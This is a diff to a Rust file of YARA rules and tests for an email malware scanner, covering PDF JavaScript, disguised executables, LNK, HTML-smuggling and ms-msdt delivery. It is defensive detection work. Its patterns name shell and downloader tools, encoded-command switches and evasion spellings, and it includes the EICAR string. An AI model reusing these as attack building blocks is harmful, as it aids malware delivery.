@@ -65,6 +65,9 @@ rule PDF_JavaScript {
         $pdf = "%PDF" ascii
         $js_entry1 = "/JavaScript" ascii nocase
         $js_entry2 = "/JS" ascii
+        // ISO 32000 #hh name-escape spellings of the JS entry tokens.
+        $js_entry3 = "/J#61vaScript" ascii nocase
+        $js_entry4 = "/J#53" ascii
         $action1 = "eval(" ascii nocase
         $action2 = "app.alert" ascii nocase
         $action3 = "/Launch" ascii
@@ -73,13 +76,50 @@ rule PDF_JavaScript {
         $action6 = "util.printf" ascii nocase
         $action7 = "getAnnots" ascii nocase
         $action8 = "getURL" ascii nocase
+        // #hh name-escape spellings of the automatic-action tokens.
+        $action9 = "/L#61unch" ascii
+        $action10 = "/Op#65nAction" ascii
     condition:
-        $pdf at 0 and any of ($js_entry*) and any of ($action*)
+        $pdf in (0..1024) and any of ($js_entry*) and any of ($action*)
+}
+
+rule PDF_JavaScript_ObjStm {
+    meta:
+        description = "PDF 对象流（ObjStm）解压层内的 JavaScript — 解压层不再携带 %PDF 锚点，PDF_JavaScript 对 layer 必然失明，此变体不以 $pdf 为条件"
+        category = "malicious_document"
+        severity = "high"
+        fidelity = "high"
+    strings:
+        // Decoded ObjStm/object-stream layers are scanned without the %PDF
+        // header, so require a PDF dictionary marker to keep plain JS/HTML
+        // content that merely mentions "/JS" from matching.
+        $dict = "<<" ascii
+        $js_entry1 = "/JavaScript" ascii nocase
+        // Short JS entry token with a PDF delimiter right after it (regex so
+        // `/S/JS(...)`, `/JS>>` and newline-separated spellings all match
+        // without letting a bare "/JS" substring in arbitrary JS code hit).
+        $js_entry2 = /\/JS[\s>\(\[\]\/]/ ascii
+        // ISO 32000 #hh name-escape spellings of the JS entry tokens.
+        $js_entry4 = "/J#61vaScript" ascii nocase
+        $js_entry5 = "/J#53" ascii
+        $action1 = "eval(" ascii nocase
+        $action2 = "app.alert" ascii nocase
+        $action3 = "/Launch" ascii
+        $action4 = "/OpenAction" ascii
+        $action5 = "this.exportDataObject" ascii nocase
+        $action6 = "util.printf" ascii nocase
+        $action7 = "getAnnots" ascii nocase
+        $action8 = "getURL" ascii nocase
+        // #hh name-escape spellings of the automatic-action tokens.
+        $action9 = "/L#61unch" ascii
+        $action10 = "/Op#65nAction" ascii
+    condition:
+        $dict and any of ($js_entry*) and any of ($action*)
 }
 
 rule PDF_EmbeddedFile {
     meta:
-        description = "PDF 嵌入FileObject + Suspicious动作（Launch/OpenAction）"
+        description = "PDF 嵌入FileObject并包含自动动作（Launch/OpenAction）"
         category = "malicious_document"
         severity = "medium"
     strings:
@@ -88,12 +128,12 @@ rule PDF_EmbeddedFile {
         $ef2 = "/FileAttachment" ascii
         $launch = "/Launch" ascii
         $openaction = "/OpenAction" ascii
-        $mz = { 4D 5A }
     condition:
-        $pdf at 0 and (
-            $launch or
-            (any of ($ef*) and ($openaction or $mz))
-        )
+        // Embedded files are common in legitimate PDFs (portfolio, invoice,
+        // accessibility and attachment workflows). Require both an embedded
+        // file object and an automatic action; a stray MZ byte in a compressed
+        // stream is not evidence of an executable payload.
+        $pdf in (0..1024) and any of ($ef*) and ($launch or $openaction)
 }
 
 rule RTF_OLE_Object {
@@ -107,7 +147,7 @@ rule RTF_OLE_Object {
         $ole2 = "\\objemb" ascii nocase
         $ole3 = "d0cf11e0" ascii nocase
     condition:
-        $rtf at 0 and any of ($ole*)
+        $rtf in (0..1024) and any of ($ole*)
 }
 
 rule Office_DDE_Field {
@@ -146,31 +186,43 @@ rule Office_Macro_Obfuscation {
 }
 "#;
 
-/// Executable file Rule (6 Item)
-/// detect PE/ELF/MachO Documentation/ImageMedium, extension, SFX Decompress
+/// Executable attachment candidates. Full PE/container validation is performed
+/// by `yara::structural`; raw YARA candidates never receive a hard risk floor.
 pub const EXECUTABLE_DISGUISE_RULES: &str = r#"
-rule PE_In_Document {
+rule PE_In_Container_Structural_Candidate {
     meta:
-        description = "PE Executable file嵌入在非Executable file容Device/HandlerMedium"
-        category = "executable_disguise"
-        severity = "critical"
+        description = "Container bytes contain an MZ-to-PE pointer relationship; requires format-aware structural confirmation"
+        category = "pe_structural_candidate"
+        severity = "low"
+        fidelity = "hunting"
     strings:
         $mz = { 4D 5A }
-        $pe = { 50 45 00 00 }
         $doc = { D0 CF 11 E0 }
         $pdf = "%PDF" ascii
         $jpg = { FF D8 FF }
         $png = { 89 50 4E 47 }
         $zip = { 50 4B 03 04 }
     condition:
-        $mz and $pe and any of ($doc, $pdf, $jpg, $png, $zip)
+        // A compressed document routinely contains the byte pairs `MZ` and
+        // `PE\\0\\0` by chance.  Treat an embedded PE as executable evidence
+        // only when a candidate MZ header has a bounded DOS e_lfanew pointer
+        // that resolves to a real PE signature.  The size bound also keeps a
+        // random pointer from making the scanner read arbitrary offsets.
+        any of ($doc, $pdf, $jpg, $png, $zip) and
+        for any i in (1..#mz) : (
+            @mz[i] + 0x40 <= filesize and
+            uint32(@mz[i] + 0x3c) <= 16MB and
+            @mz[i] + uint32(@mz[i] + 0x3c) + 4 <= filesize and
+            uint32(@mz[i] + uint32(@mz[i] + 0x3c)) == 0x00004550
+        )
 }
 
 rule ELF_In_Attachment {
     meta:
-        description = "ELF 2Base/Radix嵌入在emailAttachmentMedium"
-        category = "executable_disguise"
-        severity = "critical"
+        description = "ELF executable attachment"
+        category = "executable_attachment"
+        severity = "high"
+        fidelity = "exact"
     strings:
         $elf = { 7F 45 4C 46 }
     condition:
@@ -179,9 +231,10 @@ rule ELF_In_Attachment {
 
 rule MachO_In_Attachment {
     meta:
-        description = "Mach-O 2Base/Radix嵌入在emailAttachmentMedium"
-        category = "executable_disguise"
-        severity = "critical"
+        description = "Mach-O executable attachment"
+        category = "executable_attachment"
+        severity = "high"
+        fidelity = "exact"
     strings:
         $macho1 = { FE ED FA CE }
         $macho2 = { FE ED FA CF }
@@ -196,6 +249,7 @@ rule SFX_Self_Extracting_Archive {
         description = "自DecompressCompresspacket（SFX）packetContains可Executeline入口"
         category = "executable_disguise"
         severity = "high"
+        fidelity = "high"
     strings:
         $mz = { 4D 5A }
         $rar_sfx = "SFX" ascii
@@ -203,7 +257,10 @@ rule SFX_Self_Extracting_Archive {
         $winrar = "WinRAR SFX" ascii nocase
         $7z_sfx = "7-Zip SFX" ascii nocase
     condition:
-        $mz at 0 and any of ($rar_sfx, $zip_sfx, $winrar, $7z_sfx)
+        $mz at 0 and
+        uint32(0x3c) >= 0x40 and uint32(0x3c) < filesize - 24 and
+        uint32(uint32(0x3c)) == 0x00004550 and
+        any of ($rar_sfx, $zip_sfx, $winrar, $7z_sfx)
 }
 
 rule Packed_UPX_Executable {
@@ -211,13 +268,17 @@ rule Packed_UPX_Executable {
         description = "UPX Add壳ofExecutable file（常见Malicious软件打packetMethod）"
         category = "executable_disguise"
         severity = "high"
+        fidelity = "high"
     strings:
         $mz = { 4D 5A }
         $upx1 = "UPX0" ascii
         $upx2 = "UPX1" ascii
         $upx3 = "UPX!" ascii
     condition:
-        $mz at 0 and any of ($upx*)
+        $mz at 0 and
+        uint32(0x3c) >= 0x40 and uint32(0x3c) < filesize - 24 and
+        uint32(uint32(0x3c)) == 0x00004550 and
+        2 of ($upx*)
 }
 
 rule Executable_Script_Polyglot {
@@ -225,6 +286,7 @@ rule Executable_Script_Polyglot {
         description = "脚本/可Executeline多态File（Same时可作 多种格式Parse）"
         category = "executable_disguise"
         severity = "high"
+        fidelity = "high"
     strings:
         $mz = { 4D 5A }
         $js_start = "<script" ascii nocase
@@ -232,7 +294,10 @@ rule Executable_Script_Polyglot {
         $vbs_start = "CreateObject" ascii nocase
         $ps_start = "powershell" ascii nocase
     condition:
-        $mz and any of ($js_start, $hta_start, $vbs_start, $ps_start)
+        $mz at 0 and
+        uint32(0x3c) >= 0x40 and uint32(0x3c) < filesize - 24 and
+        uint32(uint32(0x3c)) == 0x00004550 and
+        any of ($js_start, $hta_start, $vbs_start, $ps_start)
 }
 "#;
 
@@ -350,6 +415,8 @@ rule EICAR_Test_File {
         description = "EICAR 反病毒TestFile"
         category = "malware_family"
         severity = "critical"
+        fidelity = "exact"
+        breaker = "true"
     strings:
         $eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*" ascii
     condition:
@@ -450,17 +517,26 @@ rule HTA_Execution {
 
 rule Base64_Encoded_PE {
     meta:
-        description = "Base64 Encodeof PE Executable file（Memory注入常用手法）"
+        description = "Base64 PE data combined with a decoder and in-memory or script execution primitive"
         category = "webshell"
-        severity = "critical"
+        severity = "high"
+        fidelity = "high"
     strings:
         $b64_mz = "TVqQAAMAAAA" ascii
         $b64_mz2 = "TVpQAAIAAAA" ascii
         $b64_mz3 = "TVoAAAAAAAA" ascii
         $reflect = "ReflectiveLoader" ascii
         $inject = "VirtualAlloc" ascii nocase
+        $decode1 = "FromBase64String" ascii nocase
+        $decode2 = "atob(" ascii
+        $decode3 = "certutil -decode" ascii nocase
+        $execute1 = "Assembly.Load" ascii nocase
+        $execute2 = "CreateThread" ascii nocase
+        $execute3 = "Invoke-Expression" ascii nocase
+        $execute4 = "ADODB.Stream" ascii nocase
     condition:
-        any of ($b64_mz*) or ($reflect and $inject)
+        (any of ($b64_mz*) and any of ($decode*) and any of ($execute*)) or
+        ($reflect and $inject)
 }
 "#;
 
@@ -535,7 +611,7 @@ rule Doc_Callback_Phishing {
         $urgency3 = "charged" ascii nocase
         $urgency4 = "auto-renew" ascii nocase
     condition:
-        $pdf at 0 and
+        $pdf in (0..1024) and
         2 of ($sub*) and any of ($amount*) and
         2 of ($call*) and any of ($urgency*)
 }
@@ -545,42 +621,50 @@ rule Doc_Callback_Phishing {
 pub const EVASION_TECHNIQUE_RULES: &str = r#"
 rule Evasion_LNK_Command_Exec {
     meta:
-        description = "恶意 LNK 快捷方式 — 调用 cmd/powershell/mshta 执行命令"
+        description = "Weaponized LNK combines a script/LOLBin launcher, execution switch, and remote or encoded payload delivery"
         category = "evasion_technique"
         severity = "high"
+        fidelity = "high"
         author = "Vigilyx YARA Foundry"
         mitre_attack = "T1204.002"
     strings:
-        $lnk_magic = { 4C 00 00 00 01 14 02 00 }
-        $cmd1 = "cmd" ascii nocase
-        $cmd2 = "cmd.exe" ascii nocase
-        $ps1 = "powershell" ascii nocase
-        $ps2 = "pwsh" ascii nocase
-        $mshta = "mshta" ascii nocase
-        $wscript = "wscript" ascii nocase
-        $cscript = "cscript" ascii nocase
-        $rundll = "rundll32" ascii nocase
-        $hidden1 = "/c " ascii nocase
-        $hidden2 = "-w hidden" ascii nocase
-        $hidden3 = "-WindowStyle" ascii nocase
+        $lnk_magic = { 4C 00 00 00 01 14 02 00 00 00 00 00 C0 00 00 00 00 00 00 46 }
+        $launcher1 = "cmd.exe" ascii wide nocase
+        $launcher2 = "powershell" ascii wide nocase
+        $launcher3 = "pwsh.exe" ascii wide nocase
+        $launcher4 = "mshta.exe" ascii wide nocase
+        $launcher5 = "wscript.exe" ascii wide nocase
+        $launcher6 = "cscript.exe" ascii wide nocase
+        $launcher7 = "rundll32.exe" ascii wide nocase
+        $launcher8 = "regsvr32.exe" ascii wide nocase
+        $exec1 = "/c " ascii wide nocase
+        $exec2 = "-encodedcommand" ascii wide nocase
+        $exec3 = "-enc " ascii wide nocase
+        $exec4 = "-windowstyle hidden" ascii wide nocase
+        $exec5 = "javascript:" ascii wide nocase
+        $delivery1 = "http://" ascii wide nocase
+        $delivery2 = "https://" ascii wide nocase
+        $delivery3 = "\\\\" ascii wide
+        $delivery4 = "downloadstring" ascii wide nocase
+        $delivery5 = "invoke-webrequest" ascii wide nocase
+        $delivery6 = "frombase64string" ascii wide nocase
     condition:
         $lnk_magic at 0 and
-        any of ($cmd*, $ps*, $mshta, $wscript, $cscript, $rundll) and
-        any of ($hidden*)
+        any of ($launcher*) and any of ($exec*) and any of ($delivery*) and
+        filesize < 5MB
 }
 
 rule Evasion_ISO_IMG_Delivery {
     meta:
         description = "ISO/IMG 磁盘镜像投递 — 绕过 MOTW 标记，内含可执行文件"
         category = "evasion_technique"
-        severity = "high"
+        severity = "medium"
+        fidelity = "medium"
         author = "Vigilyx YARA Foundry"
         mitre_attack = "T1553.005"
     strings:
         $iso_magic = "CD001" ascii
         $udf_magic = "NSR0" ascii
-        $mz = { 4D 5A }
-        $pe = { 50 45 00 00 }
         $exe = ".exe" ascii nocase
         $dll = ".dll" ascii nocase
         $lnk = ".lnk" ascii nocase
@@ -589,8 +673,8 @@ rule Evasion_ISO_IMG_Delivery {
         $vbs = ".vbs" ascii nocase
         $js_ext = ".js" ascii nocase
     condition:
-        ($iso_magic or $udf_magic) and
-        ($mz or $pe or 2 of ($exe, $dll, $lnk, $bat, $cmd, $vbs, $js_ext))
+        (($iso_magic at 0x8001) or $udf_magic) and
+        3 of ($exe, $dll, $lnk, $bat, $cmd, $vbs, $js_ext)
 }
 
 rule Evasion_HTML_Smuggling {
@@ -598,6 +682,7 @@ rule Evasion_HTML_Smuggling {
         description = "HTML 走私 — 邮件附件 HTML 内嵌 Base64/Blob 解码释放恶意文件"
         category = "evasion_technique"
         severity = "high"
+        fidelity = "high"
         author = "Vigilyx YARA Foundry"
         mitre_attack = "T1027.006"
     strings:
@@ -621,23 +706,39 @@ rule Evasion_HTML_Smuggling {
         (any of ($dl*) or any of ($mime*))
 }
 
+rule Evasion_PDF_Name_Escape_Obfuscation {
+    meta:
+        description = "PDF #hh 名称转义混淆 — 用 /#45ncrypt、/Fl#61teDecode 等写法隐藏关键 PDF token"
+        category = "evasion_technique"
+        severity = "high"
+        author = "Vigilyx YARA Foundry"
+        mitre_attack = "T1027"
+    strings:
+        $pdf = "%PDF" ascii
+        // Common #hh spellings of security-relevant PDF names
+        // (ISO 32000 §7.3.5): /Encrypt, /FlateDecode, /JavaScript,
+        // /OpenAction, /Launch, /EmbeddedFile.
+        $esc1 = "/#45ncrypt" ascii nocase
+        $esc2 = "/Fl#61teDecode" ascii nocase
+        $esc3 = "/J#61vaScript" ascii nocase
+        $esc4 = "/Op#65nAction" ascii nocase
+        $esc5 = "/L#61unch" ascii nocase
+        $esc6 = "/#45mbeddedFile" ascii nocase
+    condition:
+        $pdf in (0..1024) and any of ($esc*)
+}
+
 rule Evasion_RTLO_Filename_Spoof {
     meta:
-        description = "RTLO (U+202E) 文件名欺骗 — 利用右到左覆盖字符伪装扩展名"
+        description = "RTLO (U+202E) 文件名欺骗 — 由结构化附件文件名检查触发"
         category = "evasion_technique"
         severity = "high"
         author = "Vigilyx YARA Foundry"
         mitre_attack = "T1036.002"
-    strings:
-        $rtlo_utf8 = { E2 80 AE }
-        $exe = ".exe" ascii nocase
-        $scr = ".scr" ascii nocase
-        $bat = ".bat" ascii nocase
-        $cmd = ".cmd" ascii nocase
-        $pif = ".pif" ascii nocase
-        $com = ".com" ascii nocase
     condition:
-        $rtlo_utf8 and any of ($exe, $scr, $bat, $cmd, $pif, $com)
+        // Raw message/attachment bytes cannot prove a filename predicate.
+        // `yara_scan` evaluates this rule against EmailAttachment.filename.
+        false
 }
 
 rule Evasion_SVG_Script_Exec {
@@ -700,14 +801,14 @@ rule Evasion_Double_Extension {
 
 rule Doc_OneNote_Embedded_Payload {
     meta:
-        description = "OneNote 文档嵌入恶意载荷 — .one 文件内含脚本/可执行文件"
+        description = "OneNote document contains a compound script-launch chain; embedded PE claims require structural validation"
         category = "evasion_technique"
-        severity = "critical"
+        severity = "high"
+        fidelity = "high"
         author = "Vigilyx YARA Foundry"
         mitre_attack = "T1566.001"
     strings:
         $onenote_magic = { E4 52 5C 7B 8C D8 A7 4D }
-        $mz = { 4D 5A }
         $hta = "<HTA:" ascii nocase
         $vbs1 = "WScript" ascii nocase
         $vbs2 = "CreateObject" ascii nocase
@@ -717,7 +818,7 @@ rule Doc_OneNote_Embedded_Payload {
         $wsf = ".wsf" ascii nocase
     condition:
         $onenote_magic at 0 and
-        ($mz or 2 of ($hta, $vbs1, $vbs2, $ps1, $cmd1, $bat1, $wsf))
+        3 of ($hta, $vbs1, $vbs2, $ps1, $cmd1, $bat1, $wsf)
 }
 "#;
 
@@ -1003,11 +1104,7 @@ rule Mal_IcedID_BokBot {
         $pdf = "%PDF" ascii
         $icedid1 = "IcedID" ascii nocase
         $icedid2 = "BokBot" ascii nocase
-        $gzip_dll = { 1F 8B 08 }
         $mz = { 4D 5A }
-        $pe = { 50 45 00 00 }
-        $photo1 = "image/jpeg" ascii
-        $photo2 = "JFIF" ascii
         $api1 = "InternetOpenA" ascii
         $api2 = "InternetConnectA" ascii
         $api3 = "HttpOpenRequestA" ascii
@@ -1016,15 +1113,22 @@ rule Mal_IcedID_BokBot {
         $hook1 = "HttpSendRequestW" ascii
         $hook2 = "InternetReadFile" ascii
     condition:
-        not ($pdf at 0) and (
+        not ($pdf in (0..1024)) and (
             (
                 any of ($icedid*) and (
-                    ($mz and $pe) or
+                    // Require either a valid embedded PE header chain or a
+                    // strong API/injection cluster.  A two-byte MZ and a
+                    // random PE byte sequence are common in compressed media.
+                    (for any i in (1..#mz) : (
+                        @mz[i] + 0x40 <= filesize and
+                        uint32(@mz[i] + 0x3c) <= 16MB and
+                        @mz[i] + uint32(@mz[i] + 0x3c) + 4 <= filesize and
+                        uint32(@mz[i] + uint32(@mz[i] + 0x3c)) == 0x00004550
+                    )) or
                     (any of ($api*) and any of ($inject*)) or
                     (any of ($hook*) and any of ($inject*))
                 )
             ) or
-            ($gzip_dll and ($mz or $pe) and any of ($photo*)) or
             (2 of ($api*) and any of ($inject*) and any of ($hook*))
         )
 }
@@ -1068,6 +1172,7 @@ rule Evasion_CHM_Delivery {
         description = "CHM (Compiled HTML Help) file with embedded script commands used for malware delivery"
         category = "evasion_technique"
         severity = "high"
+        fidelity = "high"
         author = "Vigilyx YARA Foundry"
         mitre_attack = "T1218.001"
     strings:
@@ -1084,15 +1189,16 @@ rule Evasion_CHM_Delivery {
         $ws    = "wscript" ascii nocase
     condition:
         $magic at 0 and
-        $obj and $param and
-        (any of ($exec*) or any of ($cmd*) or $ps or $mshta or $cs or $ws)
+        $obj and $param and any of ($exec*) and
+        (any of ($cmd*) or $ps or $mshta or $cs or $ws)
 }
 
 rule Evasion_VHD_VHDX_Delivery {
     meta:
         description = "VHD/VHDX virtual disk image in email attachment, used to bypass Mark-of-the-Web"
         category = "evasion_technique"
-        severity = "high"
+        severity = "medium"
+        fidelity = "exact"
         author = "Vigilyx YARA Foundry"
         mitre_attack = "T1553.005"
     strings:
@@ -1110,7 +1216,8 @@ rule Evasion_MSIX_Sideload {
     meta:
         description = "MSIX/APPX package abuse for malware sideloading via email"
         category = "evasion_technique"
-        severity = "high"
+        severity = "medium"
+        fidelity = "high"
         author = "Vigilyx YARA Foundry"
         mitre_attack = "T1218"
     strings:
@@ -1131,7 +1238,8 @@ rule Evasion_IQY_File {
     meta:
         description = "IQY (Internet Query) file that fetches external data, used for malware delivery"
         category = "evasion_technique"
-        severity = "high"
+        severity = "medium"
+        fidelity = "high"
         author = "Vigilyx YARA Foundry"
         mitre_attack = "T1059"
     strings:
@@ -1152,31 +1260,92 @@ rule Evasion_URL_Shortcut {
         description = ".url/.website shortcut file pointing to external or file:// URL"
         category = "evasion_technique"
         severity = "medium"
+        fidelity = "medium"
         author = "Vigilyx YARA Foundry"
         mitre_attack = "T1204.001"
     strings:
         $section   = "[InternetShortcut]" ascii nocase
-        $url_http  = "URL=http://" ascii nocase
-        $url_https = "URL=https://" ascii nocase
-        $url_file  = "URL=file://" ascii nocase
+        // INI parsers tolerate whitespace around the key/value separator;
+        // regex strings cover `URL = http://` as well as `URL=http://`.
+        $url_http  = /URL\s*=\s*https?:\/\// nocase
+        $url_file  = /URL\s*=\s*file:\/\// nocase
         $icon      = "IconFile=" ascii nocase
         $hotkey    = "HotKey=" ascii nocase
     condition:
-        $section in (0..64) and
-        (any of ($url_http, $url_https, $url_file)) and
-        ($icon or $hotkey or any of ($url_file, $url_http)) and
+        // Leading blank lines/BOM before the section header are legal INI;
+        // a 64-byte anchor let them push [InternetShortcut] out of view.
+        $section in (0..256) and
+        ($url_http or $url_file) and
+        ($icon or $hotkey or $url_http or $url_file) and
         filesize < 10KB
+}
+
+rule Evasion_Desktop_Entry_Exec {
+    meta:
+        description = "Linux .desktop 启动器携带 shell/下载器 Exec= 命令 — 双击即执行任意命令"
+        category = "evasion_technique"
+        severity = "high"
+        fidelity = "high"
+        author = "Vigilyx YARA Foundry"
+        mitre_attack = "T1204.002"
+    strings:
+        $header  = "[Desktop Entry]" ascii nocase
+        $exec    = /Exec\s*=/ nocase
+        $shell1  = "bash" ascii nocase
+        $shell2  = "sh -c" ascii nocase
+        $shell3  = "/bin/sh" ascii nocase
+        $shell4  = "curl" ascii nocase
+        $shell5  = "wget" ascii nocase
+        $shell6  = "python" ascii nocase
+        $shell7  = "perl" ascii nocase
+        $shell8  = "base64" ascii nocase
+        $shell9  = "nc -" ascii nocase
+        $shell10 = "ncat" ascii nocase
+    condition:
+        // Exec= alone is present in every legitimate launcher; only flag
+        // launchers whose command line invokes a shell/downloader primitive.
+        $header in (0..256) and $exec and any of ($shell*) and
+        filesize < 64KB
+}
+
+rule Evasion_RDP_Unsafe_RemoteApp_Profile {
+    meta:
+        description = "RDP profile requests an unsafe authentication posture and launches a command-capable RemoteApp or alternate shell"
+        category = "evasion_technique"
+        severity = "high"
+        fidelity = "high"
+        author = "Vigilyx YARA Foundry"
+        mitre_attack = "T1021.001"
+    strings:
+        $address = "full address:s:" ascii nocase
+        $rdp_marker1 = "screen mode id:i:" ascii nocase
+        $rdp_marker2 = "desktopwidth:i:" ascii nocase
+        $unsafe1 = "authentication level:i:0" ascii nocase
+        $unsafe2 = "prompt for credentials:i:0" ascii nocase
+        $redirect1 = "drivestoredirect:s:*" ascii nocase
+        $redirect2 = "redirectcomports:i:1" ascii nocase
+        $shell1 = "alternate shell:s:cmd.exe" ascii nocase
+        $shell2 = "alternate shell:s:powershell" ascii nocase
+        $shell3 = "remoteapplicationprogram:s:||cmd" ascii nocase
+        $shell4 = "remoteapplicationprogram:s:||powershell" ascii nocase
+        $shell5 = "remoteapplicationprogram:s:||mshta" ascii nocase
+        $shell6 = "remoteapplicationprogram:s:||wscript" ascii nocase
+    condition:
+        $address in (0..4096) and any of ($rdp_marker*) and
+        any of ($shell*) and
+        (any of ($unsafe*) or any of ($redirect*)) and
+        filesize < 512KB
 }
 "#;
 
-/// Malicious document rules V2 — template injection + XLL add-in (2 rules)
-/// NOTE: starts with `import "pe"` for Office_XLL_Addin
+/// Malicious document rules V2 — external Office delivery, protocol execution,
+/// and XLL add-ins (4 rules).
+/// Uses raw PE/MZ signatures so the same rules work with yara-x builds that do
+/// not ship the optional native `pe` module.
 pub const MALICIOUS_DOCUMENT_RULES_V2: &str = r#"
-import "pe"
-
 rule Office_Template_Injection {
     meta:
-        description = "Office document with remote template injection via external .rels target"
+        description = "Office document with remote template, subdocument, or frame injection via an external .rels target"
         category = "malicious_document"
         severity = "high"
         author = "Vigilyx YARA Foundry"
@@ -1188,8 +1357,7 @@ rule Office_Template_Injection {
         $target_https = "Target=\"https" ascii nocase
         $rel1         = "attachedTemplate" ascii nocase
         $rel2         = "subDocument" ascii nocase
-        $rel3         = "oleObject" ascii nocase
-        $rel4         = "frame" ascii nocase
+        $rel3         = "frame" ascii nocase
         $rels_marker  = ".rels" ascii
     condition:
         $pk at 0 and
@@ -1199,24 +1367,84 @@ rule Office_Template_Injection {
         any of ($rel*)
 }
 
+rule Office_External_OLE_HTML_Relationship {
+    meta:
+        description = "Decoded OOXML relationship member links an OLE object to external HTML"
+        category = "malicious_document"
+        severity = "high"
+        fidelity = "high"
+        author = "Vigilyx YARA Foundry"
+        reference = "CVE-2022-30190 delivery chain"
+    strings:
+        // This rule intentionally targets the decoded .rels member. Requiring
+        // a ZIP header here would make the condition impossible after OOXML
+        // extraction, while compressed container bytes hide the XML.
+        $root        = "<Relationships" ascii wide nocase
+        $ole_type    = "/relationships/oleObject" ascii wide nocase
+        $external    = /TargetMode[ \t\r\n]{0,32}=[ \t\r\n]{0,32}["']External["']/ ascii wide nocase
+        $remote_html = /Target[ \t\r\n]{0,32}=[ \t\r\n]{0,32}["']https?:\/\/[^"'\r\n]{1,2048}\.html!?["']/ ascii wide nocase
+    condition:
+        $root in (0..4096) and
+        $ole_type and
+        $external and
+        $remote_html and
+        filesize < 1MB
+}
+
+rule Office_MSDT_Protocol_Command_Execution {
+    meta:
+        description = "HTML or embedded script contains an ms-msdt PCWDiagnostic browse-parameter command chain"
+        category = "malicious_document"
+        severity = "high"
+        fidelity = "high"
+        author = "Vigilyx YARA Foundry"
+        reference = "CVE-2022-30190"
+        mitre_attack = "T1203"
+    strings:
+        $carrier1 = "<script" ascii wide nocase
+        $carrier2 = "window.location" ascii wide nocase
+        $carrier3 = "location.href" ascii wide nocase
+        $scheme   = "ms-msdt:" ascii wide nocase
+        $pack     = "PCWDiagnostic" ascii wide nocase
+        $browse1  = "IT_BrowseForFile" ascii wide nocase
+        $browse2  = "IT_RebrowseForFile" ascii wide nocase
+        $expr     = "$(" ascii wide
+        $exec1    = "IEX(" ascii wide nocase
+        $exec2    = "Invoke-Expression" ascii wide nocase
+        $exec3    = "powershell" ascii wide nocase
+        $exec4    = "cmd.exe" ascii wide nocase
+        $exec5    = "mshta" ascii wide nocase
+        $exec6    = "wscript" ascii wide nocase
+        $exec7    = "cscript" ascii wide nocase
+    condition:
+        any of ($carrier*) and
+        $scheme and
+        $pack and
+        any of ($browse*) and
+        $expr and
+        any of ($exec*) and
+        filesize < 2MB
+}
+
 rule Office_XLL_Addin {
     meta:
         description = "Malicious Excel XLL add-in with xlAuto export functions"
         category = "malicious_document"
-        severity = "critical"
+        severity = "high"
+        fidelity = "high"
         author = "Vigilyx YARA Foundry"
         mitre_attack = "T1137.006"
     strings:
         $mz         = "MZ" ascii
-        $pe_sig     = "PE" ascii
         $xlauto1    = "xlAutoOpen" ascii
         $xlauto2    = "xlAutoClose" ascii
         $xlauto3    = "xlAutoRegister" ascii
         $xlauto4    = "xlAutoAdd" ascii
         $xlauto5    = "xlAutoRemove" ascii
     condition:
-        $mz at 0 and $pe_sig and
-        pe.is_dll() and
+        $mz at 0 and
+        uint32(0x3c) >= 0x40 and uint32(0x3c) < filesize - 24 and
+        uint32(uint32(0x3c)) == 0x00004550 and
         any of ($xlauto*) and
         filesize < 20MB
 }
@@ -1397,10 +1625,9 @@ rule Doc_RMM_Lure {
 "#;
 
 /// Extended malware family rules V3 — Raccoon v2, Meduza, NetSupport RAT (3 rules)
-/// NOTE: starts with `import "pe"` for Raccoon and Meduza
+/// Uses raw PE/MZ signatures; yara-x does not expose the optional native `pe`
+/// module in the production image.
 pub const EXTENDED_MALWARE_RULES_V3: &str = r#"
-import "pe"
-
 rule Mal_Raccoon_Stealer_v2 {
     meta:
         description = "Raccoon Stealer v2 infostealer targeting browser credentials and crypto wallets"
@@ -1590,3 +1817,278 @@ pub const RULE_CATEGORIES: &[RuleCategoryMeta] = &[
         description: "LNK 命令执行、ISO/IMG 投递、HTML 走私、RTLO 欺骗、双扩展名、SVG 脚本、CHM 投递、VHD/VHDX 投递、MSIX 侧载、IQY 文件、URL 快捷方式",
     },
 ];
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn matching_rule_names(source: &str, data: &[u8]) -> Vec<String> {
+        let mut compiler = yara_x::Compiler::new();
+        compiler
+            .add_source(source)
+            .expect("built-in rule source must compile");
+        let rules = compiler.build();
+        let mut scanner = yara_x::Scanner::new(&rules);
+        scanner
+            .scan(data)
+            .expect("scan must succeed")
+            .matching_rules()
+            .map(|rule| rule.identifier().to_string())
+            .collect()
+    }
+
+    #[test]
+    fn test_pdf_name_escape_obfuscation_rule_fires() {
+        // PoC bypass: /FlateDecode spelled /Fl#61teDecode previously matched
+        // no PDF token rule at all.
+        let pdf = b"%PDF-1.7\n1 0 obj\n<< /Filter /Fl#61teDecode >>\nstream\nendstream\nendobj\n";
+        let names = matching_rule_names(EVASION_TECHNIQUE_RULES, pdf);
+        assert!(
+            names
+                .iter()
+                .any(|name| name == "Evasion_PDF_Name_Escape_Obfuscation"),
+            "/Fl#61teDecode must trigger the name-escape rule: {names:?}"
+        );
+
+        // /#45ncrypt spelling of /Encrypt.
+        let pdf = b"%PDF-1.7\n1 0 obj\n<< /#45ncrypt 2 0 R >>\nendobj\n%%EOF\n";
+        let names = matching_rule_names(EVASION_TECHNIQUE_RULES, pdf);
+        assert!(
+            names
+                .iter()
+                .any(|name| name == "Evasion_PDF_Name_Escape_Obfuscation"),
+            "/#45ncrypt must trigger the name-escape rule: {names:?}"
+        );
+    }
+
+    #[test]
+    fn test_pdf_name_escape_rule_quiet_on_plain_pdf() {
+        // Unescaped names are normal PDF — the evasion rule must stay silent.
+        let pdf = b"%PDF-1.7\n1 0 obj\n<< /Filter /FlateDecode >>\nstream\nendstream\nendobj\n";
+        let names = matching_rule_names(EVASION_TECHNIQUE_RULES, pdf);
+        assert!(
+            !names
+                .iter()
+                .any(|name| name == "Evasion_PDF_Name_Escape_Obfuscation"),
+            "plain /FlateDecode must not trigger the name-escape rule: {names:?}"
+        );
+    }
+
+    #[test]
+    fn test_pdf_javascript_rule_matches_hash_escaped_tokens() {
+        // PoC bypass: /J#61vaScript + /Op#65nAction spellings previously
+        // defeated the PDF_JavaScript rule's raw string matching.
+        let pdf = b"%PDF-1.7\n<< /Op#65nAction << /S /J#61vaScript /J#53 (app.alert(1)) >> >>\n";
+        let names = matching_rule_names(MALICIOUS_DOCUMENT_RULES, pdf);
+        assert!(
+            names.iter().any(|name| name == "PDF_JavaScript"),
+            "#hh-escaped JS entry + action must trigger PDF_JavaScript: {names:?}"
+        );
